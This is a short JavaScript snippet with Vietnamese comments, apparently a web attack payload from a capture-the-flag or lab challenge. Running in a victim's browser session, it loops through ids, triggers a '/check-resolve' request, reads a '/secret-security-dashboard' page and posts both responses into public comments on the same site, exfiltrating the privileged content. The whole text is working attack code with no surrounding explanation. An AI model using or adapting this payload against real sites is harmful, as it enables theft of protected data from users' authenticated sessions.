(async () => {
  for (let id = 1; id <= 8; id++) {
    // Gửi check resolve
    const txt = await fetch('/check-resolve', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `id=${id}`
    }).then(res => res.text());

    // Lấy dashboard
    const secret = await fetch('/secret-security-dashboard').then(res => res.text());

    // Gửi comment (chỉ lưu độ dài để test trước)
    const r = await fetch('/post-comment', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'comment-author=test' + encodeURIComponent(txt) +
            '&comment2=test' + encodeURIComponent(secret.substring(0, 1000)) // Cắt bớt để không bị 413
    });
    
    console.log(`ID ${id} done. Dashboard len: ${secret.length}`);
    await new Promise(r => setTimeout(r, 500)); // Nghỉ 0.5s giữa các lần
  }
})();
